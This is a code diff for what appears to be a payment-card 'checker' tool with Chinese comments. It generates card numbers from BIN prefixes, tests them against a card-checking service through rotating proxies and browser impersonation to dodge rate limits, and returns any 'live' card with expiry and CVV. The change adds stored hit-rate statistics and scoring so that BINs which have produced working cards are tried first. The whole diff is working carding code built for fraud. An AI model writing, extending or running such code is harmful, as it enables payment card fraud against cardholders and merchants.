@@ -34,7 +34,88 @@ CHKR_PROXY_PORTS: list = [
     int(p) for p in _os.environ.get("CHKR_PROXY_PORTS", "10910,10911,10912,10916").split(",")
     if p.strip().isdigit()
 ]
-RAPIDAPI_KEY = _os.environ.get("RAPIDAPI_KEY", "")  # RapidAPI key for bin-checker19
+RAPIDAPI_KEY   = _os.environ.get("RAPIDAPI_KEY", "")  # RapidAPI key for bin-checker19
+BIN_STATS_FILE = _os.environ.get("BIN_STATS_FILE",
+    "/data/Toolkit/data/bin_stats.json")   # BIN 命中率持久化文件
+
+# ── BIN 评分 / 自动学习 ──────────────────────────────────────────────────────
+import json as _json, threading as _threading, datetime as _dt_mod
+
+_bin_stats_lock = _threading.Lock()
+
+
+def load_bin_stats() -> dict:
+    """加载 BIN 统计文件，返回 {bin6: {attempts, live, cards_tried, last_live}} 字典。"""
+    try:
+        with open(BIN_STATS_FILE, "r") as _f:
+            return _json.load(_f)
+    except Exception:
+        return {}
+
+
+def save_bin_stats(stats: dict) -> None:
+    """持久化 BIN 统计到文件（线程安全）。"""
+    try:
+        _os.makedirs(_os.path.dirname(BIN_STATS_FILE), exist_ok=True)
+        tmp = BIN_STATS_FILE + ".tmp"
+        with open(tmp, "w") as _f:
+            _json.dump(stats, _f, indent=2, ensure_ascii=False)
+        _os.replace(tmp, BIN_STATS_FILE)
+    except Exception as _e:
+        pass  # 统计写入失败不影响主流程
+
+
+def update_bin_stats(bin6: str, found_live: bool, cards_tried: int) -> None:
+    """更新单个 BIN 的统计数据并保存。"""
+    with _bin_stats_lock:
+        stats = load_bin_stats()
+        entry = stats.get(bin6, {"attempts": 0, "live": 0,
+                                  "cards_tried": 0, "last_live": None})
+        entry["attempts"]    += 1
+        entry["cards_tried"] += cards_tried
+        if found_live:
+            entry["live"]      += 1
+            entry["last_live"]  = _dt_mod.date.today().isoformat()
+        stats[bin6] = entry
+        save_bin_stats(stats)
+
+
+def _bin_score(entry: dict) -> float:
+    """
+    BIN 评分函数（越高越优先）。
+    - Laplace 平滑: (live + 0.5) / (attempts + 1)
+    - 7 天内有命中记录: ×1.5 加权
+    - 无记录的新 BIN 得 0.5 分（排在有记录但命中率 0 的 BIN 前面）
+    """
+    if not entry:
+        return 0.5   # 新 BIN，给中性分，优先于已知全部失败的 BIN
+    attempts  = entry.get("attempts",    0)
+    live      = entry.get("live",        0)
+    last_live = entry.get("last_live",   None)
+    score = (live + 0.5) / (attempts + 1)
+    if last_live:
+        try:
+            delta = (_dt_mod.date.today() -
+                     _dt_mod.date.fromisoformat(last_live)).days
+            if delta <= 7:
+                score *= 1.5
+        except Exception:
+            pass
+    return score
+
+
+def rank_bins(bins: list) -> list:
+    """
+    根据历史命中率重排 BIN 列表（高分优先）。
+    首次运行或无统计时保持原顺序。
+    """
+    stats = load_bin_stats()
+    if not stats:
+        return list(bins)
+    scored = [(b, _bin_score(stats.get(b, {}))) for b in bins]
+    scored.sort(key=lambda x: x[1], reverse=True)
+    return [b for b, _ in scored]
+
 
 # curl_cffi session cache (per proxy_port) — browser impersonation avoids 403/429
 _chkr_sessions: dict = {}
@@ -192,15 +273,21 @@ def find_live_card(bins: list, max_per_bin: int = CHKR_MAX,
     Fast-fails when proxy IPs are globally rate-limited.
     Returns "CARDNUM|MM|YYYY|CVV" or None.
     """
-    log(f"[chkr] searching {len(bins)} BINs, max {max_per_bin} cards each", "info")
+    # 按历史命中率重排 BIN（首次运行时保持原顺序）
+    ranked = rank_bins(bins)
+    log(f"[chkr] searching {len(ranked)} BINs (ranked), max {max_per_bin} cards each", "info")
+
     # Try direct (port=0) first, then proxy cycle
     _proxy_cycle = [0] + list(CHKR_PROXY_PORTS) if CHKR_PROXY_PORTS else [0]
     _proxy_idx = 0
     total_429 = 0
-    for bin6 in bins:
+
+    for bin6 in ranked:
         log(f"[chkr] BIN {bin6} ...", "info")
-        cards = gen_cards_from_bin(bin6, count=max_per_bin)
-        bin_429 = 0
+        cards      = gen_cards_from_bin(bin6, count=max_per_bin)
+        bin_429    = 0
+        bin_tried  = 0   # 本 BIN 实际检测张数（用于更新统计）
+
         for i, card_str in enumerate(cards):
             preview = card_str[:10] + "xxxxxx|" + "|".join(card_str.split("|")[1:])
             log(f"[chkr] [{i+1}/{len(cards)}] {preview}", "dbg")
@@ -209,13 +296,18 @@ def find_live_card(bins: list, max_per_bin: int = CHKR_MAX,
             result  = check_card_chkr(card_str, log=log, proxy_port=_port)
             code    = result.get("code", -1)
             msg     = result.get("message", "")
+
             if code == 1:
+                bin_tried += 1
+                update_bin_stats(bin6, found_live=True, cards_tried=bin_tried)
                 log(f"[chkr] LIVE! {preview} ({msg})", "ok")
                 return card_str
             elif code == 0:
+                bin_tried += 1
                 bin_429 = 0; total_429 = 0
                 log(f"[chkr] die: {msg}", "dbg")
             elif code == 2:
+                bin_tried += 1
                 bin_429 = 0; total_429 = 0
                 log(f"[chkr] unknown: {msg}", "dbg")
             else:
@@ -227,13 +319,17 @@ def find_live_card(bins: list, max_per_bin: int = CHKR_MAX,
                     if bin_429 >= CHKR_SKIP_BIN_AFTER:
                         log(f"[chkr] BIN {bin6}: {bin_429} consecutive 429s, skipping", "warn")
                         break
-                    # global block detection
-                    if total_429 >= len(bins) * CHKR_SKIP_BIN_AFTER:
+                    if total_429 >= len(ranked) * CHKR_SKIP_BIN_AFTER:
                         log("[chkr] all proxies globally rate-limited, aborting", "error")
+                        update_bin_stats(bin6, found_live=False, cards_tried=bin_tried)
                         return None
                     time.sleep(3)
                     continue
             time.sleep(delay)
+
+        # BIN 遍历结束 (未找到 live 或 429 跳出)
+        update_bin_stats(bin6, found_live=False, cards_tried=bin_tried)
+
     log("[chkr] no live card found in any BIN", "error")
     return None
 
